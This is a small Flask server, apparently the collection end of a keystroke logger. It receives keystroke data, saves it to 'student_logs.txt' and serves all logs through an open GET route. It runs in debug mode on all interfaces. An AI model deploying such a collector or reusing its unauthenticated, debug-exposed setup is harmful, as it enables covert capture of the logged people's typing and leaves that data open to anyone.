from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# Store logs in memory (or could be a database in a production environment)
logs = []

# Route to handle incoming keystroke data
@app.route('/logs', methods=['POST'])
def receive_logs():
    data = request.get_json()  # Get JSON data sent from the client
    if not data:
        return jsonify({"error": "No data received"}), 400

    logs.append(data)
    print(f"Received data: {data}")

    # Save the log to a file for persistent storage (or could be saved to a DB)
    with open("student_logs.txt", "a") as file:
        file.write(f"{datetime.now()} - {data}\n")

    return jsonify({"status": "success"}), 200

@app.route('/logs', methods=['GET'])
def get_logs():
    return jsonify(logs)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)  # Make sure to adjust the port and IP as needed
